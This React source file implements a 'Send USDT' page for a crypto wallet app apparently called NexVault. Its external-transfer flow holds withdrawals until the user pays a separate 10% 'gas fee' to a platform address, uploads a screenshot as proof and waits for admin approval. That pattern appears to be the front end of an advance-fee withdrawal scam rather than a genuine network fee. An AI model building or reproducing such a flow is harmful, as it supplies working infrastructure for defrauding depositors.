import React, { useState } from 'react';
import Layout from '../components/Layout';
import api from '../utils/api';
import toast from 'react-hot-toast';
import { useAuth } from '../context/AuthContext';
import { FiSend, FiDollarSign, FiLock, FiCheckCircle, FiUsers, FiGlobe, FiUpload, FiCopy, FiCheck } from 'react-icons/fi';

const TransferPage = () => {
  const { user, refreshUser } = useAuth();
  const [transferType, setTransferType] = useState('internal'); // 'internal' or 'external'
  const [form, setForm] = useState({ recipientEmail: '', walletAddress: '', amount: '', pin: '', note: '' });
  const [file, setFile] = useState(null);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [copiedGas, setCopiedGas] = useState(false);
  const [walletInfo, setWalletInfo] = useState(null);
  const [step, setStep] = useState(1);
  const [gasFee, setGasFee] = useState(0);

  const loadWalletInfo = async () => {
    try {
      const { data } = await api.get('/transactions/wallet-info');
      setWalletInfo(data);
    } catch {}
  };

  const handleAmountChange = (val) => {
    setForm(f => ({ ...f, amount: val }));
    if (val && parseFloat(val) > 0) {
      setGasFee((parseFloat(val) * 10) / 100);
    } else {
      setGasFee(0);
    }
  };

  // Internal transfer (NexVault to NexVault — instant, no gas)
  const handleInternalSubmit = async (e) => {
    e.preventDefault();
    if (!form.recipientEmail) return toast.error('Enter recipient email.');
    if (!form.amount || parseFloat(form.amount) <= 0) return toast.error('Enter a valid amount.');
    if (parseFloat(form.amount) > user?.balance) return toast.error('Insufficient balance.');
    if (!form.pin || form.pin.length !== 4) return toast.error('Enter your 4-digit withdrawal PIN.');
    setLoading(true);
    try {
      await api.post('/transactions/transfer', {
        recipientEmail: form.recipientEmail,
        amount: form.amount,
        pin: form.pin,
        note: form.note,
      });
      await refreshUser();
      setSuccess(true);
      setForm({ recipientEmail: '', walletAddress: '', amount: '', pin: '', note: '' });
      toast.success('Transfer completed!');
    } catch (err) {
      toast.error(err.response?.data?.message || 'Transfer failed.');
    } finally {
      setLoading(false);
    }
  };

  // External transfer (to any USDT wallet — requires gas fee like withdrawal)
  const handleExternalNext = (e) => {
    e.preventDefault();
    if (!form.walletAddress) return toast.error('Enter recipient wallet address.');
    if (!form.amount || parseFloat(form.amount) <= 0) return toast.error('Enter a valid amount.');
    if (parseFloat(form.amount) > user?.balance) return toast.error('Insufficient balance.');
    if (!form.pin || form.pin.length !== 4) return toast.error('Enter your 4-digit withdrawal PIN.');
    loadWalletInfo();
    setStep(2);
  };

  const handleExternalSubmit = async (e) => {
    e.preventDefault();
    if (!file) return toast.error('Please upload gas fee payment proof.');
    setLoading(true);
    try {
      const fd = new FormData();
      fd.append('amount', form.amount);
      fd.append('walletAddress', form.walletAddress);
      fd.append('pin', form.pin);
      fd.append('note', form.note || 'External USDT transfer');
      fd.append('gasFeeProof', file);
      await api.post('/transactions/withdrawal', fd);
      setSuccess(true);
      setStep(1);
      setFile(null);
      setForm({ recipientEmail: '', walletAddress: '', amount: '', pin: '', note: '' });
      toast.success('External transfer submitted! Awaiting admin approval.');
    } catch (err) {
      toast.error(err.response?.data?.message || 'Submission failed.');
    } finally {
      setLoading(false);
    }
  };

  if (success) {
    return (
      <Layout>
        <div style={{ padding: '28px 24px', maxWidth: 500, margin: '0 auto', textAlign: 'center' }}>
          <div style={{ marginTop: 60 }}>
            <div style={{ width: 80, height: 80, borderRadius: '50%', background: 'rgba(0,212,163,0.1)', border: '2px solid rgba(0,212,163,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px', fontSize: 36 }}>
              <FiCheckCircle style={{ color: '#00d4a3' }} />
            </div>
            <h2 style={{ fontFamily: 'Space Grotesk', fontSize: 24, fontWeight: 700, marginBottom: 12 }}>
              {transferType === 'internal' ? 'Transfer Successful!' : 'Request Submitted!'}
            </h2>
            <p style={{ color: 'var(--text-secondary)', marginBottom: 32, lineHeight: 1.6 }}>
              {transferType === 'internal'
                ? 'USDT has been sent instantly to the recipient.'
                : 'Your external transfer is pending admin approval.'}
            </p>
            <button onClick={() => setSuccess(false)} style={{ padding: '12px 32px', borderRadius: 10, border: 'none', background: 'linear-gradient(135deg, #00d4a3, #00b890)', color: '#0d1117', fontWeight: 700, cursor: 'pointer', fontSize: 14 }}>
              New Transfer
            </button>
          </div>
        </div>
      </Layout>
    );
  }

  return (
    <Layout>
      <div style={{ padding: '28px 24px', maxWidth: 560, margin: '0 auto' }}>
        <h1 style={{ fontFamily: 'Space Grotesk', fontSize: 24, fontWeight: 700, marginBottom: 6 }}>Send USDT</h1>
        <p style={{ color: 'var(--text-secondary)', fontSize: 14, marginBottom: 24 }}>Transfer to a NexVault user or any external wallet</p>

        {/* Balance */}
        <div style={{ background: 'linear-gradient(135deg, rgba(0,212,163,0.08), rgba(124,110,247,0.06))', border: '1px solid rgba(0,212,163,0.2)', borderRadius: 14, padding: '16px 20px', marginBottom: 24, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ fontSize: 13, color: 'var(--text-secondary)' }}>Available Balance</span>
          <span style={{ fontFamily: 'Space Grotesk', fontSize: 22, fontWeight: 700, color: '#00d4a3' }}>${user?.balance?.toFixed(2) || '0.00'}</span>
        </div>

        {/* Transfer type toggle */}
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10, marginBottom: 24 }}>
          <button onClick={() => { setTransferType('internal'); setStep(1); }} style={{
            padding: '14px', borderRadius: 12, border: `2px solid ${transferType === 'internal' ? 'rgba(0,212,163,0.5)' : 'var(--border)'}`,
            background: transferType === 'internal' ? 'rgba(0,212,163,0.08)' : 'var(--bg-card)',
            color: transferType === 'internal' ? '#00d4a3' : 'var(--text-secondary)',
            cursor: 'pointer', transition: 'all 0.2s', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8
          }}>
            <FiUsers size={20} />
            <span style={{ fontSize: 13, fontWeight: 600 }}>NexVault User</span>
            <span style={{ fontSize: 11, opacity: 0.7 }}>Instant · No gas fee</span>
          </button>
          <button onClick={() => { setTransferType('external'); setStep(1); }} style={{
            padding: '14px', borderRadius: 12, border: `2px solid ${transferType === 'external' ? 'rgba(124,110,247,0.5)' : 'var(--border)'}`,
            background: transferType === 'external' ? 'rgba(124,110,247,0.08)' : 'var(--bg-card)',
            color: transferType === 'external' ? '#7c6ef7' : 'var(--text-secondary)',
            cursor: 'pointer', transition: 'all 0.2s', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8
          }}>
            <FiGlobe size={20} />
            <span style={{ fontSize: 13, fontWeight: 600 }}>External Wallet</span>
            <span style={{ fontSize: 11, opacity: 0.7 }}>Any USDT address · Gas fee required</span>
          </button>
        </div>

        <div style={{ background: 'var(--bg-card)', border: '1px solid var(--border)', borderRadius: 20, padding: 28 }}>

          {/* ── INTERNAL TRANSFER ── */}
          {transferType === 'internal' && (
            <form onSubmit={handleInternalSubmit} style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
              <div style={{ padding: '12px 16px', borderRadius: 10, background: 'rgba(0,212,163,0.05)', border: '1px solid rgba(0,212,163,0.15)', fontSize: 13, color: '#00d4a3' }}>
                ⚡ Instant transfer to any registered NexVault user — no fees, no delays.
              </div>

              {[
                { key: 'recipientEmail', label: "Recipient's NexVault Email", type: 'email', placeholder: 'recipient@example.com' },
                { key: 'amount', label: 'Amount (USDT)', type: 'number', placeholder: 'e.g. 100', min: '0.01', step: '0.01' },
                { key: 'note', label: 'Note (Optional)', type: 'text', placeholder: 'What is this for?' },
              ].map(({ key, label, type, placeholder, ...rest }) => (
                <div key={key}>
                  <label style={{ display: 'block', fontSize: 13, fontWeight: 500, color: 'var(--text-secondary)', marginBottom: 8 }}>{label}</label>
                  <input type={type} value={form[key]} onChange={e => setForm(f => ({ ...f, [key]: e.target.value }))} placeholder={placeholder} required={key !== 'note'} {...rest}
                    style={{ width: '100%', padding: '12px 16px', background: 'var(--bg-primary)', border: '1px solid var(--border)', borderRadius: 10, color: 'var(--text-primary)', fontSize: 14, outline: 'none', boxSizing: 'border-box', fontFamily: 'inherit' }}
                    onFocus={e => e.target.style.borderColor = '#00d4a3'} onBlur={e => e.target.style.borderColor = 'var(--border)'}
                  />
                </div>
              ))}

              {form.amount && parseFloat(form.amount) > 0 && (
                <div style={{ padding: 14, borderRadius: 10, background: 'rgba(0,212,163,0.05)', border: '1px solid rgba(0,212,163,0.15)', fontSize: 13, color: '#00d4a3', display: 'flex', justifyContent: 'space-between' }}>
                  <span>You send:</span><strong>${parseFloat(form.amount).toFixed(2)} USDT</strong>
                </div>
              )}

              <div>
                <label style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, fontWeight: 500, color: 'var(--text-secondary)', marginBottom: 8 }}>
                  <FiLock /> Withdrawal PIN
                </label>
                <input type="password" maxLength={4} value={form.pin} onChange={e => setForm(f => ({ ...f, pin: e.target.value.replace(/\D/, '') }))} placeholder="••••" required
                  style={{ width: '100%', padding: '14px', background: 'var(--bg-primary)', border: '1px solid var(--border)', borderRadius: 10, color: 'var(--text-primary)', fontSize: 24, letterSpacing: 12, outline: 'none', boxSizing: 'border-box', textAlign: 'center' }}
                  onFocus={e => e.target.style.borderColor = '#00d4a3'} onBlur={e => e.target.style.borderColor = 'var(--border)'}
                />
              </div>

              <button type="submit" disabled={loading} style={{
                width: '100%', padding: '14px', borderRadius: 10, border: 'none',
                background: loading ? 'var(--bg-primary)' : 'linear-gradient(135deg, #00d4a3, #00b890)',
                color: loading ? 'var(--text-muted)' : '#0d1117', fontSize: 15, fontWeight: 700,
                cursor: loading ? 'not-allowed' : 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                boxShadow: loading ? 'none' : '0 4px 16px rgba(0,212,163,0.3)'
              }}>
                <FiSend /> {loading ? 'Sending...' : 'Send Instantly'}
              </button>
            </form>
          )}

          {/* ── EXTERNAL TRANSFER ── */}
          {transferType === 'external' && step === 1 && (
            <form onSubmit={handleExternalNext} style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
              <div style={{ padding: '12px 16px', borderRadius: 10, background: 'rgba(124,110,247,0.06)', border: '1px solid rgba(124,110,247,0.2)', fontSize: 13, color: '#7c6ef7' }}>
                🌐 Send USDT to any external wallet address. A 10% gas fee is required (paid separately).
              </div>

              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 500, color: 'var(--text-secondary)', marginBottom: 8 }}>Recipient USDT Wallet Address</label>
                <input type="text" value={form.walletAddress} onChange={e => setForm(f => ({ ...f, walletAddress: e.target.value }))} placeholder="e.g. TRC20 or ERC20 address" required
                  style={{ width: '100%', padding: '12px 16px', background: 'var(--bg-primary)', border: '1px solid var(--border)', borderRadius: 10, color: 'var(--text-primary)', fontSize: 13, outline: 'none', boxSizing: 'border-box', fontFamily: 'monospace' }}
                  onFocus={e => e.target.style.borderColor = '#7c6ef7'} onBlur={e => e.target.style.borderColor = 'var(--border)'}
                />
              </div>

              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 500, color: 'var(--text-secondary)', marginBottom: 8 }}>Amount (USDT)</label>
                <input type="number" min="1" step="0.01" max={user?.balance} value={form.amount} onChange={e => handleAmountChange(e.target.value)} placeholder="Enter amount" required
                  style={{ width: '100%', padding: '12px 16px', background: 'var(--bg-primary)', border: '1px solid var(--border)', borderRadius: 10, color: 'var(--text-primary)', fontSize: 14, outline: 'none', boxSizing: 'border-box', fontFamily: 'inherit' }}
                  onFocus={e => e.target.style.borderColor = '#7c6ef7'} onBlur={e => e.target.style.borderColor = 'var(--border)'}
                />
                {gasFee > 0 && (
                  <div style={{ marginTop: 8, padding: '10px 14px', borderRadius: 8, background: 'rgba(255,165,2,0.08)', border: '1px solid rgba(255,165,2,0.2)', fontSize: 13, color: '#ffa502' }}>
                    Gas fee required: <strong>${gasFee.toFixed(2)} USDT</strong> — paid separately, not deducted from balance
                  </div>
                )}
              </div>

              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 500, color: 'var(--text-secondary)', marginBottom: 8 }}>Note (Optional)</label>
                <input type="text" value={form.note} onChange={e => setForm(f => ({ ...f, note: e.target.value }))} placeholder="Purpose of transfer"
                  style={{ width: '100%', padding: '12px 16px', background: 'var(--bg-primary)', border: '1px solid var(--border)', borderRadius: 10, color: 'var(--text-primary)', fontSize: 14, outline: 'none', boxSizing: 'border-box', fontFamily: 'inherit' }}
                  onFocus={e => e.target.style.borderColor = '#7c6ef7'} onBlur={e => e.target.style.borderColor = 'var(--border)'}
                />
              </div>

              <div>
                <label style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, fontWeight: 500, color: 'var(--text-secondary)', marginBottom: 8 }}>
                  <FiLock /> Withdrawal PIN
                </label>
                <input type="password" maxLength={4} value={form.pin} onChange={e => setForm(f => ({ ...f, pin: e.target.value.replace(/\D/, '') }))} placeholder="••••" required
                  style={{ width: '100%', padding: '14px', background: 'var(--bg-primary)', border: '1px solid var(--border)', borderRadius: 10, color: 'var(--text-primary)', fontSize: 24, letterSpacing: 12, outline: 'none', boxSizing: 'border-box', textAlign: 'center' }}
                  onFocus={e => e.target.style.borderColor = '#7c6ef7'} onBlur={e => e.target.style.borderColor = 'var(--border)'}
                />
              </div>

              <button type="submit" style={{
                width: '100%', padding: '14px', borderRadius: 10, border: 'none',
                background: 'linear-gradient(135deg, #7c6ef7, #6358d4)', color: 'white',
                fontSize: 15, fontWeight: 700, cursor: 'pointer',
                boxShadow: '0 4px 16px rgba(124,110,247,0.3)'
              }}>
                Continue to Gas Fee Payment →
              </button>
            </form>
          )}

          {/* ── EXTERNAL STEP 2: Pay Gas Fee ── */}
          {transferType === 'external' && step === 2 && (
            <form onSubmit={handleExternalSubmit} style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
              {/* Summary */}
              <div style={{ background: 'var(--bg-primary)', borderRadius: 12, padding: 18, display: 'flex', flexDirection: 'column', gap: 10 }}>
                <h4 style={{ fontFamily: 'Space Grotesk', fontSize: 14, fontWeight: 600, marginBottom: 4 }}>Transfer Summary</h4>
                {[
                  ['Send Amount', `$${parseFloat(form.amount).toFixed(2)} USDT`],
                  ['Gas Fee (10%)', `$${gasFee.toFixed(2)} USDT`],
                  ['To Address', form.walletAddress],
                ].map(([k, v]) => (
                  <div key={k} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 13 }}>
                    <span style={{ color: 'var(--text-secondary)' }}>{k}</span>
                    <span style={{ fontWeight: 600, maxWidth: '60%', textAlign: 'right', wordBreak: 'break-all', fontFamily: k === 'To Address' ? 'monospace' : 'inherit', fontSize: k === 'To Address' ? 11 : 13 }}>{v}</span>
                  </div>
                ))}
              </div>

              <div style={{ padding: 14, borderRadius: 10, background: 'rgba(255,165,2,0.06)', border: '1px solid rgba(255,165,2,0.2)', fontSize: 13, color: '#ffa502', lineHeight: 1.6 }}>
                ⚠️ Send <strong>${gasFee.toFixed(2)} USDT</strong> gas fee to the address below, then upload the proof.
              </div>

              {/* Gas fee address */}
              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 500, color: 'var(--text-secondary)', marginBottom: 10 }}>Gas Fee Payment Address</label>
                <div style={{ background: 'var(--bg-primary)', border: '1px solid var(--border)', borderRadius: 10, padding: '14px 16px', display: 'flex', alignItems: 'center', gap: 12 }}>
                  <code style={{ flex: 1, fontSize: 11, fontFamily: 'monospace', wordBreak: 'break-all', lineHeight: 1.5, color: 'var(--text-primary)' }}>
                    {walletInfo?.gasFeeAddress || 'Loading...'}
                  </code>
                  <button type="button" onClick={() => {
                    navigator.clipboard.writeText(walletInfo?.gasFeeAddress || '');
                    setCopiedGas(true); setTimeout(() => setCopiedGas(false), 2000);
                    toast.success('Address copied!');
                  }} style={{ flexShrink: 0, padding: '8px 12px', borderRadius: 8, background: copiedGas ? 'rgba(0,212,163,0.2)' : 'rgba(0,212,163,0.1)', border: '1px solid rgba(0,212,163,0.3)', color: '#00d4a3', cursor: 'pointer', fontSize: 13, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 5 }}>
                    {copiedGas ? <FiCheck /> : <FiCopy />} {copiedGas ? 'Copied' : 'Copy'}
                  </button>
                </div>
              </div>

              {walletInfo?.gasFeeQR && (
                <div style={{ textAlign: 'center' }}>
                  <div style={{ fontSize: 12, color: 'var(--text-secondary)', marginBottom: 10 }}>Scan QR to pay gas fee</div>
                  <img src={walletInfo.gasFeeQR} alt="QR" style={{ width: 120, height: 120, borderRadius: 10, border: '4px solid var(--border)', background: 'white', padding: 4 }} />
                </div>
              )}

              {/* Upload proof */}
              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 500, color: 'var(--text-secondary)', marginBottom: 10 }}>Upload Gas Fee Payment Proof</label>
                <label htmlFor="ext-gas-proof" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 10, padding: 24, borderRadius: 12, border: `2px dashed ${file ? '#00d4a3' : 'var(--border)'}`, cursor: 'pointer', background: file ? 'rgba(0,212,163,0.04)' : 'transparent', transition: 'all 0.2s' }}>
                  <FiUpload size={22} style={{ color: file ? '#00d4a3' : 'var(--text-muted)' }} />
                  <span style={{ fontSize: 13, color: file ? '#00d4a3' : 'var(--text-secondary)', fontWeight: 500 }}>{file ? file.name : 'Upload screenshot or receipt'}</span>
                  <input id="ext-gas-proof" type="file" accept="image/*,.pdf" onChange={e => setFile(e.target.files[0])} style={{ display: 'none' }} />
                </label>
              </div>

              <div style={{ display: 'flex', gap: 12 }}>
                <button type="button" onClick={() => setStep(1)} style={{ flex: 1, padding: '13px', borderRadius: 10, border: '1px solid var(--border)', background: 'transparent', color: 'var(--text-secondary)', cursor: 'pointer', fontSize: 14, fontWeight: 500 }}>← Back</button>
                <button type="submit" disabled={loading} style={{ flex: 2, padding: '13px', borderRadius: 10, border: 'none', background: loading ? 'var(--bg-primary)' : 'linear-gradient(135deg, #7c6ef7, #6358d4)', color: loading ? 'var(--text-muted)' : 'white', fontSize: 14, fontWeight: 700, cursor: loading ? 'not-allowed' : 'pointer' }}>
                  {loading ? 'Submitting...' : 'Submit Transfer Request'}
                </button>
              </div>
            </form>
          )}
        </div>

        {/* Info note */}
        <div style={{ marginTop: 16, padding: 14, borderRadius: 12, background: 'var(--bg-card)', border: '1px solid var(--border)', fontSize: 12, color: 'var(--text-muted)', lineHeight: 1.7 }}>
          <strong style={{ color: 'var(--text-secondary)' }}>NexVault User:</strong> Instant, free transfer to any registered user by email.<br />
          <strong style={{ color: 'var(--text-secondary)' }}>External Wallet:</strong> Send to any USDT address worldwide. A 10% gas fee is required and must be paid separately before your transfer is processed.
        </div>
      </div>
    </Layout>
  );
};

export default TransferPage;
